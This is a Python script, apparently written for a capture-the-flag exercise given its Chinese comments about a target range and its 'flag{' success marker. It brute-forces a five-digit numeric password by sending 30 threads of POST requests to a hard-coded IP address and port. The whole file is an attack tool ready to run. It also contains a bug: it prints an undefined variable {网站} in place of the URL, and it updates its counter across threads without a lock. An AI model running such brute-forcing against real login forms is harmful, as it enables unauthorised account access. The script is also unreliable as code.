import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==================== 配置区(仅改这里) ====================
URL = "http://160.202.254.160:10447/?yes"
PARAM = "pwd"        # 表单参数名
DIGITS = 5           # 密码位数
THREADS = 30         # 线程数(靶场推荐20~30)
SUCC_FLAG = "flag{"  # 成功特征(关键词/flag标识)
TIMEOUT = 3
SHOW_FALSE = True   # True=全部打印False(看轨迹)  False=静默(只看进度/结果,防刷屏)
# =========================================================

found = False
count = 0
total = 10 ** DIGITS

def check_pwd(num):
    global found, count
    if found:
        return

    pwd = f"{num:0{DIGITS}d}"
    data = {PARAM: pwd}
    try:
        res = requests.post(URL, data=data, timeout=TIMEOUT)
        count += 1

        # 每200条输出一次进度
        if count % 200 == 0:
            print(f"进度: {count}/{total}")

        if SUCC_FLAG in res.text:
            found = True
            print(f"\n【✅ 成功】密码: {pwd}")
            print(f"响应内容:\n{res.text}\n")
        else:
            if SHOW_FALSE:
                print(f"{pwd} -> False")

    except Exception:
        count += 1
        if SHOW_FALSE:
            print(f"{pwd} -> False (请求异常)")

if __name__ == "__main__":
    print(f"===== {DIGITS}位数字密码爆破 =====")
    print(f"目标地址: {网站}")
    print(f"总组合数: {total} | 线程数: {THREADS}")
    print(f"输出模式: {'显示所有False' if SHOW_FALSE else '静默(仅进度/结果)'}\n")

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        tasks = [executor.submit(check_pwd, i) for i in range(total)]
        for task in as_completed(tasks):
            if found:
                executor.shutdown(wait=False)
                break

    print("===== 爆破任务结束 =====")
